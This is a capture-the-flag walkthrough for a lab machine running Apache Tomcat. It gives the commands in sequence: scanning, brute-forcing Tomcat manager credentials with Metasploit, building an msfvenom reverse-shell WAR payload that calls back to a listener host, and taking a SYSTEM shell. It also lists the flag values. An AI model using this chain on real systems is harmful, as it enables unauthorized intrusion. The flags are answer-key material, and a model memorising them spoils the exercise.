# Jerry - Easy

```shell
nmap -T4 -p- -A -Pn 10.10.10.95

feroxbuster -u http://10.10.10.95:8080 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

msfconsole -q

search tomcat login

use auxiliary/scanner/http/tomcat_mgr_login

show options

set RHOSTS 10.10.10.95

run
#we get creds

msfvenom -p java/shell_reverse_tcp lhost=10.10.14.3 lport=4445 -f war -o reverse-shell.war
#creating malicious war payload

nc -nvlp 4445
#setup listener

#upload, deploy and check war file
#we get reverse shell

whoami
#system

cd C:\Users\Administrator\Desktop

dir
#get flags
```

```markdown
Open ports & services:

  * 8080 - http - Apache Tomcat/Coyote JSP engine 1.1

We can enumerate web directories to check for anything interesting.

We have basic authentication in /manager/html and /host-manager/html

We can attempt logging into /manager/html with the help of msfconsole.

Using the tomcat_mgr_login module, we get login using creds tomcat:s3cret

Now, we can Google 'apache tomcat malicious WAR file' as the next step to get reverse shell.

After creating our payload with msfvenom and uploading it at /manager/html/upload, we need to deploy it and click the link to activate reverse shell; we will have to setup our listener as well.

Upon visiting the link, we get reverse shell as 'nt authority\system'.

Both flags can be found in Administrator's Desktop.
```

1. User flag - 7004dbcef0f854e0fb401875f26ebd00

2. Root flag - 04a8b36e1545a455393d067e772fe90e
